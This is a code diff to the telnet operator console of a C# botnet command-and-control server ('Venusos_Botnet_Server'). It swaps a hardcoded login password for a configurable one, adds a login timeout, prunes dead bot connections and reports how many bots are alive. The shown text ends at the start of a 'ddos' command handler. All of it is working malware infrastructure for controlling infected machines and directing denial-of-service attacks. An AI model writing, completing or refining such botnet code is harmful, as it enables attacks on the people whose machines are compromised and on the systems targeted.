@@ -10,10 +10,9 @@ namespace Venusos_Botnet_Server
     {
         public static void StartListener()
         {
-            Console.WriteLine("Telnet console is avaiable on {0}:23\n\r", Tools.GetLocalIP());
+            string password = Tools.GetPassword();
 
-            bool logged = false;
-            bool just_logged = false;
+            Console.WriteLine("Telnet console is avaiable on {0}:23\n", Tools.GetLocalIP());
 
             while (true)
             {
@@ -22,8 +21,10 @@ namespace Venusos_Botnet_Server
 
                 try
                 {
-                    int i;
-                    string data;
+                    int i = 0;
+                    string data = "";
+                    bool logged = false;
+                    bool just_logged = false;
                     byte[] bytes = new byte[256];
 
                     TcpClient tcpClient = tcpListener.AcceptTcpClient();
@@ -42,27 +43,29 @@ namespace Venusos_Botnet_Server
 
                         if (!logged)
                         {
-                            if (data is "test")
+                            if (data == password)
                             {
-                                Console.WriteLine("Client connected");
+                                timer.Stop();
                                 logged = true;
                                 just_logged = true;
+                                Console.WriteLine("Client connected");
                             }
                             if (timer.Elapsed.TotalSeconds > 10)
                             {
+                                timer.Stop();
                                 tcpClient.Close();
                                 throw new Exception("Wrong password");
                             }
                         }
                         else
                         {
+                            BotsServer.tcpClients.RemoveAll(x => !x.Connected);
+
                             if (just_logged)
                             {
-                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type help to get more info!\n\r"));
                                 just_logged = false;
+                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type help to get more info!\n\r"));
                             }
-
-                            BotsServer.tcpClients.RemoveAll(x => !x.Connected);
 
                             if (data.StartsWith("help"))
                             {
@@ -72,6 +75,7 @@ namespace Venusos_Botnet_Server
                             {
                                 int all, alive;
                                 all = alive = 0;
+
                                 foreach (TcpClient bot in BotsServer.tcpClients)
                                 {
                                     all++;
@@ -81,6 +85,7 @@ namespace Venusos_Botnet_Server
                                         networkStream.Write(Encoding.ASCII.GetBytes(((IPEndPoint)bot.Client.RemoteEndPoint).Address + " is alive\n\r"));
                                     }
                                 }
+
                                 networkStream.Write(Encoding.ASCII.GetBytes(alive + " bots are alive out of " + all + "\n\r"));
                             }
                             else if (data.StartsWith("ddos"))
